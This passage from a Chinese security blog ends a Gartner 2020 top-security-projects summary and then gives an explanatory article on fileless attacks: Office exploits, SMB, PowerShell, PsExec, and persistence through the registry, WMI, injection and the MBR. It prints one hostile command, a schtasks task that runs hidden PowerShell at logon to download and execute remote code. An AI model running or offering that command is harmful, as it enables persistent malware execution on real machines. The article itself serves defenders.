id="5-8-数据分类与保护项目"><a href="#5-8-数据分类与保护项目" class="headerlink" title="5.8    数据分类与保护项目"></a>5.8    数据分类与保护项目</h2><h3 id="5-8-1-项目描述"><a href="#5-8-1-项目描述" class="headerlink" title="5.8.1     项目描述"></a>5.8.1     项目描述</h3><p>不用的用户对待数据各不相同。确保你有一个定义明确的、有技术支撑的数据分类与保护策略。该项目名称虽然叫数据分类与保护，但实际上重点聚焦于数据分类，它是数据保护的基础。</p><h3 id="5-8-2-项目难度"><a href="#5-8-2-项目难度" class="headerlink" title="5.8.2     项目难度"></a>5.8.2     项目难度</h3><p>中等到难。需要用户理解数据分类模式。能否实现自动化很重要。</p><h3 id="5-8-3-项目关键"><a href="#5-8-3-项目关键" class="headerlink" title="5.8.3     项目关键"></a>5.8.3     项目关键</h3><p>定义明确的数据分类模式；业务逻辑在分类和保护级别上消除了歧义；统筹考虑本地和云端数据使用。</p><h3 id="5-8-4-项目建议"><a href="#5-8-4-项目建议" class="headerlink" title="5.8.4     项目建议"></a>5.8.4     项目建议</h3><p>在确定技术路线之前先从策略和定义开始。与现有数据保护工具集成，利用平台/API。</p><h3 id="5-8-5-技术成熟度"><a href="#5-8-5-技术成熟度" class="headerlink" title="5.8.5     技术成熟度"></a>5.8.5     技术成熟度</h3><p>根据Gartner2020年的数据安全Hype Cycle，数据分类目前处于青春期阶段，位于炒作的顶峰。</p><h3 id="5-8-6-技术解析"><a href="#5-8-6-技术解析" class="headerlink" title="5.8.6     技术解析"></a>5.8.6     技术解析</h3><p><strong>Gartner****认为，数据分类是一个使用事先商定好的分类规则、方法或者本体论对信息资产进行组织的过程。它可为涵盖价值，安全，访问，使用，隐私，存储，道德，质量和留存等诸多要素在内的数据和分析治理策略提供有效和高效的数据优先级划分。</strong>数据分类通常会导致开发大型的元数据存储库以用于做出进一步的决策，或者将“标签”应用于数据对象以促进数据在其生命周期中的使用和管理。</p><p>从数据生命周期的角度来看，数据分类十分重要，起到了承上启下的作用，如下图所示：</p><p><a href="./Gartner2020%E5%B9%B4%E5%8D%81%E5%A4%A7%E5%AE%89%E5%85%A8%E9%A1%B9%E7%9B%AE%E8%AF%A6%E8%A7%A3/1603849909776817.png" class="gallery-item"><img src="/2021/10/19/Gartner2020%E5%B9%B4%E5%8D%81%E5%A4%A7%E5%AE%89%E5%85%A8%E9%A1%B9%E7%9B%AE%E8%AF%A6%E8%A7%A3/1603849909776817.png"></a></p><p>从数据安全的角度来看，数据分类也很重要，是数据分析与价值评估的重要前提。</p><p>此外，随着对数据隐私与保护问题的日益重视，数据分类的价值愈发凸显。</p><p>总体上，数据分类是一个很困难的过程。首先就是确定分类方法论和分类标准。然后，作为一个简化，Gartner建议在识别、标记和存储组织所有数据的时候先不要考虑数据的价值、用途和风险。接下来再利用信息经济学的方法来评估数据价值，剔除低价值数据，优化数据管理成本。</p><p>此外，数据分类应该是一个持续、自适应和反复迭代的永续过程，是一个持续改进的过程，可以划分为计划、建立（又进一步细化为诊断、制定、实施）、监控三个阶段，这当中运用自动化技术和手段至关重要。</p><p>这里对数据分类模式和自动化进一步展开阐述。</p><p>数据分类模式是分类工作的基础，很多数据分类项目首先就失败在复杂的分类模式上了。Gartner建议要构建一个易于理解的数据分类模式，不要过分追求大而全，而首先考虑可理解性。分类模式设计堪称一门艺术，很难有固定的标准，但Gartner建议将很多本来打算用分类模式来阐述的属性放置到数据标签甚至是不同的操作规程中去体现，笔者认为这是一个不错的主意。</p><p>自动化是提升数据分类效率的重要帮手，否则即便有好的分类模式，面对海量数据也难以落地实施。不过，面对不同的数据、数据所处的状态（静态、动态），要采用不同的自动化工具，而不存在一个统一的工具。还有，完全自动化也不靠谱，还是需要人（包括用户）的参与。</p><h2 id="5-9-员工胜任力评估项目"><a href="#5-9-员工胜任力评估项目" class="headerlink" title="5.9    员工胜任力评估项目"></a>5.9    员工胜任力评估项目</h2><h3 id="5-9-1-项目描述"><a href="#5-9-1-项目描述" class="headerlink" title="5.9.1     项目描述"></a>5.9.1     项目描述</h3><p>数字业务计划要求我们要有合适的人担任合适角色，并且有合适的数量，拥有合适的技能和胜任力。</p><p>此前，我们一直都在谈安全人才的匮乏，聚焦在人的数量上。但Gartner却把重点放到安全业者的胜任力上，并超越了岗位角色、职责、技能问题，讨论的是如何提升人员素质，聚焦在人的质量上。</p><p>这个项目要求领导者梳理安全团队技能和胜任力情况，确定4到6项对组织成功至关重要的额4到6项胜任力，并将这几个胜任力用于新人的招聘和现有人员的培养。</p><h3 id="5-9-2-项目难度"><a href="#5-9-2-项目难度" class="headerlink" title="5.9.2     项目难度"></a>5.9.2     项目难度</h3><p>中等。需要对文化、能力进行诚实的评估，并加以教育和培训。</p><h3 id="5-9-3-项目关键"><a href="#5-9-3-项目关键" class="headerlink" title="5.9.3     项目关键"></a>5.9.3     项目关键</h3><p>要区分开角色、技能和胜任力的差异；优先采用基于胜任力的岗位描述，不存在“完美”的员工；专注于提升4至6项胜任力。</p><h3 id="5-9-4-项目建议"><a href="#5-9-4-项目建议" class="headerlink" title="5.9.4     项目建议"></a>5.9.4     项目建议</h3><p>你可以找到厂商来支撑你，但这个项目必须是你自己的安全团队驱动的。</p><h3 id="5-9-5-技术成熟度"><a href="#5-9-5-技术成熟度" class="headerlink" title="5.9.5     技术成熟度"></a>5.9.5     技术成熟度</h3><p>员工胜任力评估总体上属于软性的过程性的项目，如果说跟技术相关的话，就是在评估过程中可以借助一些技术手段来提高评估的效率和有效性。如果查看Gartner针对该项目推介的厂商清单，可以发现基本都对应了基于计算机的安全意识培训厂商。这些厂商有的可以提供培训平台（基于本地的，或者基于云的），有的则擅长制作各类培训课件，有的课件还兼具实战性。但总体上来说，这些厂商都无法向用户出具关键的胜任力清单，也无法给用户提供一套现成的岗位职责说明书模板，这些都是用户自己的事儿。</p><p>根据Gartner在2019年所作的统计，基于计算机的安全意识培训市场在2018年的规模约为4.51亿美元，预计2019年将达到6.2亿美元。同时，Gartner预计，至少到2023年，该市场将以42％的复合年增长率（CAGR）增长。</p><p>Gartner未在成熟度曲线中描述基于计算机的安全意识培训相关技术。笔者认为，该市场涉及的技术并不复杂，主要是业务模式和内容、形式的开发。稍微复杂一点的网络钓鱼测试与反钓鱼训练技术其实也可以归入邮件安全技术之中。</p><h3 id="5-9-6-项目解析"><a href="#5-9-6-项目解析" class="headerlink" title="5.9.6     项目解析"></a>5.9.6     项目解析</h3><p>要实施该项目，核心就亮点：1）理解什么是胜任力，它与技能和角色的关系是什么？2）构建自身安全团队的胜任力模型。</p><p>根据Gartner的定义，所谓<strong>胜任力是指个人在给定角色中产生卓越绩效的可观测、可度量和可预测的特征，譬如业务敏锐度、数字灵巧性，等</strong>。</p><p>相较而言，技能是指在执行工作或者任务的过程中观测到的动手能力，譬如在应用安全中使用PKI加密和数字签名，配置网络和安全策略，等。</p><p>角色是一组相关的功能和职责所对应的某个特定工作岗位，譬如安全分析师，安全运营经理，等。</p><p>从管理学的角度来看，胜任力的提出者麦克利兰认为它是指能将某一工作中有卓越成就者与普通者区分开来的个人的深层次特征，它可以是动机、特质、自我形象、态度或价值观、某领域知识、认知或行为技能等任何可以被可靠测量或计数的并且能显著区分优秀与一般绩效的个体特征。显然Gartner参考了这个权威定义。</p><p>人们通常用冰山模型来描述胜任力的不同特质，并特别强调要重视冰山之下的那些鉴别性特征，如<a href="https://baike.baidu.com/item/%E8%83%9C%E4%BB%BB%E5%8A%9B/2199566"> 下图所示</a>：</p><p><a href="./Gartner2020%E5%B9%B4%E5%8D%81%E5%A4%A7%E5%AE%89%E5%85%A8%E9%A1%B9%E7%9B%AE%E8%AF%A6%E8%A7%A3/1603849924427701.png" class="gallery-item"><img src="/2021/10/19/Gartner2020%E5%B9%B4%E5%8D%81%E5%A4%A7%E5%AE%89%E5%85%A8%E9%A1%B9%E7%9B%AE%E8%AF%A6%E8%A7%A3/1603849924427701.png"></a></p><p>可见，技能只是胜任力的浅层表现，要做好胜任力评估，关键是要提取出与本组织情景条件相适合的深层特征。</p><p>Gartner认为，为了实现数字化业务转型，必须为员工建立数字化胜任力模型，并应用于安全与风险管理领域。Gartner给出了一份包括12项胜任力的数字化胜任力模型，并阐述了他们如何映射到安全与风险领域，其中6个主要的胜任力如下图所示，分别是：适应性、业务敏锐度、数字灵巧性、产出驱动、协作/协同</p><p><a href="./Gartner2020%E5%B9%B4%E5%8D%81%E5%A4%A7%E5%AE%89%E5%85%A8%E9%A1%B9%E7%9B%AE%E8%AF%A6%E8%A7%A3/1603849931905396.png" class="gallery-item"><img src="/2021/10/19/Gartner2020%E5%B9%B4%E5%8D%81%E5%A4%A7%E5%AE%89%E5%85%A8%E9%A1%B9%E7%9B%AE%E8%AF%A6%E8%A7%A3/1603849931905396.png"></a></p><p>建好了胜任力模型和重点胜任力清单，接下来就要建立安全团队的角色清单、技能清单，并将他们互相关联起来。这里，Gartner特别提到了可以参考《<a href="https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-181.pdf"> NIST SP800-181网络教育国家倡议（NICE）网络劳动力框架</a>》来构建自己的技能清单，该标准列举了374项技能，176种能力，52个角色。</p><h2 id="5-10安全风险评估自动化项目"><a href="#5-10安全风险评估自动化项目" class="headerlink" title="5.10安全风险评估自动化项目"></a>5.10安全风险评估自动化项目</h2><h3 id="5-10-1-项目描述"><a href="#5-10-1-项目描述" class="headerlink" title="5.10.1 项目描述"></a>5.10.1 项目描述</h3><p>Gartner发现只有58%的安全领导能够对所有重大新项目进行持续的风险评估。自动化风险评估能够使IT交付更高效。</p><p>与2019年在安全与风险管理领域提出的安全评级服务（SRS）不同，2020年的自动化安全风险评估很泛泛，可以涉及多个子领域和技术方向。某种意义上而言，SRS就是一种自动化风险评估技术，BAS、漏扫也算是一种自动化风险评估技术。从Gartner针对该项目推介的厂商清单来分析，笔者认为Gartner主要是针对集成风险管理（IRM）子领域来讨论其中的风险评估自动化问题。IRM大致对应业界一般所指的治理风险与合规（GRC），只是前几年Gartner将GRC这个概念进行了彻底的拆分。</p><h3 id="5-10-2-项目难度"><a href="#5-10-2-项目难度" class="headerlink" title="5.10.2 项目难度"></a>5.10.2 项目难度</h3><p>中等到难。谨记是业务部门决定承担多少风险，安全部门在于提供控制措施的指导（这与第三章摘录的Gartner对于项目成功关键因素的表述如出一辙）。</p><h3 id="5-10-3-项目关键"><a href="#5-10-3-项目关键" class="headerlink" title="5.10.3 项目关键"></a>5.10.3 项目关键</h3><p>要设法缓解控制措施测试与监测过程中的安全资源瓶颈问题；通过专业的沟通来提升对于风险评估评级的信心。</p><h3 id="5-10-4-项目建议"><a href="#5-10-4-项目建议" class="headerlink" title="5.10.4 项目建议"></a>5.10.4 项目建议</h3><p>充分利用对风险评估至关重要的安全数据源，并将从这些数据源提取相关数据及后续分析的工作流程自动化。</p><h3 id="5-10-5-技术成熟度"><a href="#5-10-5-技术成熟度" class="headerlink" title="5.10.5 技术成熟度"></a>5.10.5 技术成熟度</h3><p>根据Gartner 2020年的风险管理Hype Cycle，IRM目前处于青春期阶段，正在向失望低谷滑落。</p><h3 id="5-10-6-技术解析"><a href="#5-10-6-技术解析" class="headerlink" title="5.10.6 技术解析"></a>5.10.6 技术解析</h3><p>安全风险评估（Security Risk Assessment）是Gartner十分看重的一项工作，写过大量的报告和指南。安全风险评估这个概念已经有了二十年的历史了，十分古老，意义不言自明，是安全领域的一个理论基石，但更多是停留在理念、标准、规范层面，不论是ISO27005，还是NIST SP800-30都有专门的论述。很早以前，人们（譬如笔者）就在试图将这个工作形式化，借助系统来自动运行，至今仍然在为之努力，目前主要是体现在GRC类产品和平台之中。近些年来，由于人们更多将目光投射到面向对抗的安全领域，对于安全风险评估有所淡忘。事实上，Gartner一直在关注这个领域，并且是作为安全的五大分支之一在持续跟踪研究。</p><p>回到安全风评估技术本身，它属于风险管理框架的组成要素之一，如下是Gartner的风险管理框架：</p><p><a href="./Gartner2020%E5%B9%B4%E5%8D%81%E5%A4%A7%E5%AE%89%E5%85%A8%E9%A1%B9%E7%9B%AE%E8%AF%A6%E8%A7%A3/1603849945976301.png" class="gallery-item"><img src="/2021/10/19/Gartner2020%E5%B9%B4%E5%8D%81%E5%A4%A7%E5%AE%89%E5%85%A8%E9%A1%B9%E7%9B%AE%E8%AF%A6%E8%A7%A3/1603849945976301.png"></a></p><p>如果我们看NIST SP800-30，或者ISO27000系列，对于风险管理和风险评估的阐释也都差不多，这里不再赘述。</p><p>Gartner建议，为了降低风险评估工作的操作复杂度，提升这项工作的成效（量化效果），必须引入自动化技术。</p><p><strong>Gartner****表示，安全风险评估自动化的目标是将定义明确且可重复的风险评估过程的各个要素整合起来，以识别、度量和处置IT风险</strong>。自动化风险评估的一个重要价值就在于采用一致和一贯的标准（譬如NIST CSF框架、ISO27001，或者风险计算模型和公式）来估算风险，使得风险度量的结果可比较，改进情况真正可度量。</p><p>Gartner表示，向安全风险评估项目注入某种程度的自动化的目的是确保随着时间的推移，对评估结果保持一致性和信心。</p><p>进一步分析安全风险评估自动化的技术手段。最典型的一类自动化分析手段就是利用日志分析技术，采集关键数据源的文本信息，基于预定义的风险模型进行计算和分析。但实际上，风险评估时仅仅采集与分析控制措施运行后产生的痕迹信息是远远不够的，还需要对控制措施及其过程进行测试验证，包括采用BAS、配置核查、漏洞扫描、资产测绘，也包括采用诸如SOAR、RPA技术手段将多个重复的测试过程串起来，还包括采取诸如ISACA推介的<a href="https://www.isaca.org/resources/isaca-journal/issues/2015/volume-2/a-practical-approach-to-continuous-control-monitoring"> 连续控制措施监测</a>（CCM）方法论。</p><p>6     候选安全项目</p><p>2020年的候选安全项目清单中还包括：</p><p><a href="./Gartner2020%E5%B9%B4%E5%8D%81%E5%A4%A7%E5%AE%89%E5%85%A8%E9%A1%B9%E7%9B%AE%E8%AF%A6%E8%A7%A3/1603849955280981.png" class="gallery-item"><img src="/2021/10/19/Gartner2020%E5%B9%B4%E5%8D%81%E5%A4%A7%E5%AE%89%E5%85%A8%E9%A1%B9%E7%9B%AE%E8%AF%A6%E8%A7%A3/1603849955280981.png"></a></p><p>１）       员工（网络）监视与（物理）监视技术；</p><p>２）       threat溯源服务</p><p>３）       自动化threat猎捕</p><p>４）       网络靶场和网络仿真</p><p>５）       基于聊天机器人的安全意识培训与教育</p><p>６）       生物特征凭据检测与保护</p><p>７）       量子一切【暂译】</p><p>８）       安全访问服务边缘（SASE）</p><p>９）       信息物理系统（CSP）安全——无人机检测、体温检测</p><p>7     综合建议</p><p>在峰会上，发言人Brain Reed给出了几点综合性建议：</p><p>１）       如果你只能做一件事，那么把保障员工远程访问的安全放在首位；</p><p>２）       在选择项目的时候，不要仅仅关注削减风险的项目，也要考虑使能业务的项目，意即要一定做些体现业务价值的安全项目。在这点上，国内外的考量基本一致。</p><p>３）       如果你正在将数据和应用向云中迁移，请考察ZNTA、CSPM和SASE。</p><p>４）       认清你的安全胜任力（以及缺陷），并制定一份提升安全意识和教育的计划。</p><p>8     参考信息</p><p>1.      Top 10 Security Projects for 2020, Gartner Security and Risk Management Summit 2020;</p><p>2.      <a href="https://www.gartner.com/smarterwithgartner/gartner-top-security-projects-for-2020-2021/"> Security and risk management leaders should focus on these 10 security projects to drive business-value and reduce risk for the business</a>. Gartner;</p><p>3.      Top Five Midsize Enterprise Security Projects for 2020, Gartner;</p><p>4.      <a href="https://mp.weixin.qq.com/s?__biz=MzUyNzMxOTAwMw==&mid=2247484140&idx=1&sn=1105fa84d9caec3938d6b4d0285f0648&chksm=fa002858cd77a14ec627e6960b895ec729e5c100820c9c5a388ddb60c3d6882bfd18a78bfc32&token=1002297424&lang=zh_CN#rd"> Gartner：2020年中型企业的5大安全项目，Benny Ye</a>；</p><p>5.      <a href="https://mp.weixin.qq.com/s?__biz=MzUyNzMxOTAwMw==&mid=2247483855&idx=1&sn=a5f1f85d5f1c8a7c30168c48f6d03241&chksm=fa002b7bcd77a26d6258a73b6e4dde8d7d75c6496f68ce14d7f19510ed198ec28a2a14638ccd&token=1002297424&lang=zh_CN#rd"> Gartner 2019年十大安全技术详解</a>，Benny Ye；</p><p>6.      <a href="https://blog.51cto.com/yepeng/2311492"> Gartner 2018年十大安全技术详解</a>，Benny Ye；</p><p>7.      Market Guide for Zero Trust Network Access 2020, Gartner；</p><p>8.      Market Guide for Vulnerability Assessment 2019, Gartner;</p><p>9.      Innovation Insight for Extended Detection and Response, Gartner;</p><p>10.  Innovation Insight for Cloud Security Posture Management, Gartner;</p><p>11.  Hype Cycle for Cloud Security, 2020, Gartner;</p><p>12.  Market Guide for Email Security 2020, Gartner;</p><p>13.  Hype Cycle for Data Security, 2020, Gartner；</p><p>14.  Hype Cycle for Security Operations, 2020, Gartner.</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> Gartner </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>无文件攻击的各种姿势</title>
      <link href="/2021/09/16/%E6%97%A0%E6%96%87%E4%BB%B6%E6%94%BB%E5%87%BB%E7%9A%84%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF/"/>
      <url>/2021/09/16/%E6%97%A0%E6%96%87%E4%BB%B6%E6%94%BB%E5%87%BB%E7%9A%84%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css"><div class=".article-gallery" <p>原创：<a href>合天智汇</a><p></p><p>0x01</p><p>很多应急响应行动中都会出现这样的场景：客户主机出现CPU占用率很高或有连接C&amp;C服务器的可疑现象，但是使用杀软查杀却没有发现磁盘上有恶意文件。这其实就是无文件攻击。</p><p>“无文件攻击”这个名词伴随“APT攻击”的慢慢火热而进入了人们的视野。APT的特点是不易被安全检测引擎所发现，当中的功劳很大程度都是归“无文件攻击”所有。</p><p>因为无文件攻击无需落地到目标的磁盘，因此反病毒引擎一般很难检测到，即使通过检测内存来试图追踪内存中的“无文件攻击”，但往往只能采用白名单等笨方法，但攻击者利用内存滞留技术往往能把杀毒软件耍得团团转。</p><p><a href="https://image.3001.net/images/20190509/1557371317_5cd399b54f58c.png!small" class="gallery-item"><img src="https://image.3001.net/images/20190509/1557371317_5cd399b54f58c.png!small"></a></p><p>但是“无文件攻击”这一术语往往会让人产生歧义，比如无文件攻击就代表真的没有攻击文件吗?其实“无文件攻击”只是一种攻击策略，其出发点就是避免将恶意文件放在磁盘上，以逃避安全检测。</p><p>现在安全产品的一大挑战就是给出无文件攻击的防御方案。未知攻，焉知防？本篇文章就来分析已知的无文件攻击方式。</p><p>0x02</p><p>无文件攻击方式分为三大类：漏洞型攻击、灰色工具型攻击、潜伏型攻击，这几类攻击不是独立，有时候会在同一个攻击场景中出现，如用户打开了一个恶意office文档，这个文档通过漏洞直接执行了powershell脚本进行木马植入，最后通过写入注册表实现持久化潜伏。</p><p><a href="https://image.3001.net/images/20190509/1557371335_5cd399c79f488.png!small" class="gallery-item"><img src="https://image.3001.net/images/20190509/1557371335_5cd399c79f488.png!small"></a></p><p>0x03漏洞型攻击</p><p>漏洞型攻击是杀伤力最大的无文件攻击方式，典型的漏洞有Office漏洞、SMB漏洞、以及各种WEB服务的漏洞，当目标主机存在漏洞时，病毒可以通过漏洞直接执行恶意命令攻击主机或将自己复制到主机实现扩散。漏洞型攻击行为隐蔽，且一般不会释放文件到本地，所以使用杀软几乎无法防御。</p><p>1. office漏洞</p><p>office是一个较为普遍的漏洞，常被用于APT攻击。黑客一般会给特定的目标用户发送精心设计的Office文档，此文档包含可以通过漏洞触发的恶意代码，当用户使用存在漏洞的Offic打开它时，office就会自动执行恶意代码，达到入侵的目的。</p><p>MsOffice.doc病毒，MsOffice.doc文档格式为rtf，为一个CVE-2017-0199的漏洞利用样本。将MsOffice.doc文档中的ole对象提取出来后，可以看到其指向的恶意链接为http://[xxxx].com/[xxxx]/1，如下图</p><p><a href="https://image.3001.net/images/20190509/1557371423_5cd39a1fac7f8.png!small" class="gallery-item"><img src="https://image.3001.net/images/20190509/1557371423_5cd39a1fac7f8.png!small"></a></p><p>恶意链接1文件对应着一个vbscript脚本，脚本内容如下</p><p><a href="https://image.3001.net/images/20190509/1557371440_5cd39a301215c.png!small" class="gallery-item"><img src="https://image.3001.net/images/20190509/1557371440_5cd39a301215c.png!small"></a></p><p>该vbs功能是执行一段powershell加密代码实现信息窃取。只要用户不小心打开了恶意文档，存在漏洞的Office就会自动读取远程的恶意vbs代码并执行恶意操作。由于用户点击文档后的所有攻击过程均无落地文件，所以杀软难以检测。</p><p>2. smb漏洞</p><p>SMB是windows系统自启动的通信服务，一旦它存在漏洞，那么几乎所有的windows主机都会受到风险。</p><p>勒索病毒、挖矿病毒已经存在已久了，但为什么WannaCry、WannaMine影响那么大？就是因为它们使用了SMB漏洞进行传播，可以将自身复制到内网中的所有漏洞主机上，实现大规模的感染。如下图红色框是漏洞利用环节，病毒通过此漏洞可以进行远程攻击。</p><p><a href="https://pic1.zhimg.com/80/v2-881ff3a8109cce42b5c62c9b8b5bc7f2_hd.webp" class="gallery-item"><img src="https://pic1.zhimg.com/80/v2-881ff3a8109cce42b5c62c9b8b5bc7f2_hd.webp"></a></p><p>3. web服务漏洞</p><p>诸如SQLServer、Nginx、Apache、IIS等WEB服务程序都被挖出过大型的缓冲区溢出漏洞，病毒可以通过这些漏洞实现远程命令执行，由于这些服务大都暴露在公网上，所以一旦漏洞被爆出，大范围的主机将受到风险。</p><p>SQL Slammer是2003年爆发的一种病毒，其利用SQLSERVER 2000解析端口1434缓冲区溢出漏洞对其服务进行攻击。SQLSlammer也被称为“蓝宝石”(Sapphire)，2003年1月25日首次出现。它是一个非同寻常的蠕虫病毒，给互联网的流量造成了显而易见的负面影响。有意思的是，它的目标并非终端计算机用户，而是服务器。它是一个单包的、长度为376字节的蠕虫病毒，它随机产生IP地址，并向这些IP地址发送自身。如果某个IP地址恰好是一台运行着未打补丁的微软SQL服务器桌面引擎(SQLServer Desktop Engine)软件的计算机，它也会迅速复制病毒到随机IP地址的主机</p><p><a href="https://image.3001.net/images/20190509/1557371644_5cd39afcce899.png!small" class="gallery-item"><img src="https://image.3001.net/images/20190509/1557371644_5cd39afcce899.png!small"></a></p><p>0x04灰色工具型攻击</p><p>灰色工具是指那些可以被用来执行恶意代码的合法工具，如：Powershell、PsExec等，病毒可以使用这些工具来间接执行恶意代码。由于IT管理员日常工作中都会使用这些合法工具来辅助管理系统、网络，所以杀软对这类攻击的检测也极具挑战性。</p><p>1. Powershell</p><p>powershell属于系统工具，在杀软的白名单中，要查杀只能检测其执行的脚本代码，但因为powershell支持各种混淆，所以对其进行检测也极为困难。</p><p>如下是powershellMiner病毒，由于它没有病毒文件，而是直接执行powerhsell挖矿代码，行为极其隐蔽，杀软基本查杀不出来。</p><p><a href="https://pic1.zhimg.com/80/v2-bc918a8899a637d237c26a5434c167bd_hd.webp" class="gallery-item"><img src="https://pic1.zhimg.com/80/v2-bc918a8899a637d237c26a5434c167bd_hd.webp"></a></p><p><a href="https://pic1.zhimg.com/80/v2-9a3c16b1a6f6661f58c1659a5d9db1b6_hd.webp" class="gallery-item"><img src="https://pic1.zhimg.com/80/v2-9a3c16b1a6f6661f58c1659a5d9db1b6_hd.webp"></a></p><p>如上图，病毒直接使用powershell.exe进行挖矿，CPU占用率达到87%，其脚本功能是从wmi类中读取挖矿代码并执行。</p><p><a href="https://image.3001.net/images/20190509/1557371666_5cd39b127825f.png!small" class="gallery-item"><img src="https://image.3001.net/images/20190509/1557371666_5cd39b127825f.png!small"></a></p><p>2. Psexec</p><p>PsExec也是windows的系统工具，经常被IT管理员用于远程管理内网主机。但PsExec也有可能会被病毒利用，如下是SOREBRECT病毒，只要SOREBRECT获取了远程主机的管理员密码，就可以使用PsExec远程执行命令，然后将恶意代码注入到svchost.exe中执行。PsExec.exe虽不是系统自带工具，但在windows官网上可以下载，也存在于杀入的白名单中。</p><p><a href="https://image.3001.net/images/20190509/1557371678_5cd39b1ed0f38.png!small" class="gallery-item"><img src="https://image.3001.net/images/20190509/1557371678_5cd39b1ed0f38.png!small"></a></p><p>0x05潜伏性攻击</p><p>为了让病毒母体被删除后以及每次开机后还能继续执行恶意代码，持久化潜伏成为一种常见的无文件攻击方式。通过将恶意代码存储在注册表、WMI、系统进程（进程注入）、MBR、定时任务等地方，可以让恶意代码隐蔽地自动执行。</p><p>1). 注册表</p><p>注册表中包含许多敏感表项，如HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run,只要将病毒的路径或恶意的脚本存储到这里，系统每次开机都会执行这些病毒和恶意脚本，Poweliks就是使用注册表来进行持久化攻击的代表。</p><p><a href="https://image.3001.net/images/20190509/1557371692_5cd39b2c9ea2e.png!small" class="gallery-item"><img src="https://image.3001.net/images/20190509/1557371692_5cd39b2c9ea2e.png!small"></a></p><p>poweliks病毒将恶意代码放在HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run，这样每次系统每次开机都会自动执行恶意代码。</p><p><a href="https://image.3001.net/images/20190509/1557372389_5cd39de5a9f0b.png!small" class="gallery-item"><img src="https://image.3001.net/images/20190509/1557372389_5cd39de5a9f0b.png!small"></a></p><p>2. Wmi</p><p>WMI以本地和远程方式提供了许多管理功能，包括查询系统信息、启动和停止进程以及设置条件触发器。管理员可以使用各种工具（比如Windows的WMI命令行工具wmic.exe）或者脚本编程语言（如PowerShell）提供的API接口来访问WMI。这样一个强大的工具自然会被黑客所盯上，著名的无文件攻击病毒POSHSPY就使用WMI来存储及定时执行恶意代码。以下是此病毒使用的一个触发器，意思是每周一、周二、周四、周五以及周六的当地时间上午11:33执行一次恶意脚本。</p><p><a href="https://image.3001.net/images/20190509/1557372402_5cd39df29a13d.png!small" class="gallery-item"><img src="https://image.3001.net/images/20190509/1557372402_5cd39df29a13d.png!small"></a></p><p>恶意脚本是一段powershell脚本，执行的恶意代码也是存储在WMI类中，</p><p><a href="https://image.3001.net/images/20190509/1557372424_5cd39e0836600.png!small" class="gallery-item"><img src="https://image.3001.net/images/20190509/1557372424_5cd39e0836600.png!small"></a></p><p>3. 进程注入</p><p>进程注入技术很久以前就被病毒所利用了，病毒运行后一般会将恶意代码注入到系统进程中，然后将自身删除，达到隐藏的效果，如下图是一个新型的挖矿病毒wmixml，它通过将挖矿代码注入到svchost.exe中实现挖矿，我们可以看到svchost.exe的CPU占用率极高，高达25%。</p><p><a href="https://image.3001.net/images/20190509/1557372485_5cd39e4590a2b.png!small" class="gallery-item"><img src="https://image.3001.net/images/20190509/1557372485_5cd39e4590a2b.png!small"></a></p><p>通过逆向分析wmixml病毒，发现它依次调用了VirtualAllocEx、WriteProcessMemory、ResumeThread来实现注入。</p><p><a href="https://pic1.zhimg.com/80/v2-f50947a09caeb22a6470e3fb2cf10dec_hd.webp" class="gallery-item"><img src="https://pic1.zhimg.com/80/v2-f50947a09caeb22a6470e3fb2cf10dec_hd.webp"></a></p><p>4. 定时任务</p><p>定时任务是一个实用的工具，比如我们想实现每隔一段时间进行下文件备份、日志记录等等，就可以使用到定时任务，然而，若病毒执行了以下命令，那么就会带来恶意的操作，这段代码是只要用户一登录就调用powershell执行网上的恶意代码：</p><p>schtasks/create /tn Trojan /tr “powershell.exe -WindowStyle hidden -NoLogo-NonInteractive -ep bypass -nop -c ‘IEX ((new-objectnet.webclient).downloadstring(‘’[REMOVED]’’))’” /scONLOGON /ru System</p><p>定时任务还常被病毒用来绕过UAC。</p><p><a href="https://pic1.zhimg.com/80/v2-bc7eab69d2b063c455caa8c059c23098_hd.webp" class="gallery-item"><img src="https://pic1.zhimg.com/80/v2-bc7eab69d2b063c455caa8c059c23098_hd.webp"></a></p><p>5. Mbr</p><p>MBR是系统引导程序，对系统的启动很关键，试想，若病毒隐藏恶意代码于在MBR中，就可以实现先于系统加载，绕过杀软的效果。Petya病毒是继WannaCry后的又一大勒索病毒，它比WannaCry更狠，将文件加密后，还把一段恶意代码写入MBR以实现持久化攻击，使得主机开机后无法正常启动系统，而是直接显示勒索提示框。</p><p><a href="https://image.3001.net/images/20190509/1557372551_5cd39e87ba5eb.png!small" class="gallery-item"><img src="https://image.3001.net/images/20190509/1557372551_5cd39e87ba5eb.png!small"></a></p><p>通过逆向分析Petya，可以看到其将恶意代码写入MBR操作。</p><p><a href="https://image.3001.net/images/20190509/1557372565_5cd39e9588079.png!small" class="gallery-item"><img src="https://image.3001.net/images/20190509/1557372565_5cd39e9588079.png!small"></a></p><p>相关操作学习</p><p>基于BinWalk实现文件读取：详细讲解CTF竞赛中磁盘取证分析类题目的结题方法，覆盖文件提取、已删文件恢复、文件数据修复、隐写信息提取等基本知识点。点击<a href="http://www.hetianlab.com/expc.do?ec=ECID172.19.104.182015073110594300001">实验:基于BinWalk实现文件提取(合天网安实验室)</a>开始操作！</p><p><a href="https://image.3001.net/images/20190509/1557372574_5cd39e9ebde8a.png!small" class="gallery-item"><img src="https://image.3001.net/images/20190509/1557372574_5cd39e9ebde8a.png!small"></a></p><p>声明：笔者初衷用于分享与普及网络知识，若读者因此作出任何危害网络安全行为后果自负，与合天智汇及原作者无关，本文为合天原创，如需装载，请注明出处！</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> 无文件攻击 </tag>
            
        </tags>
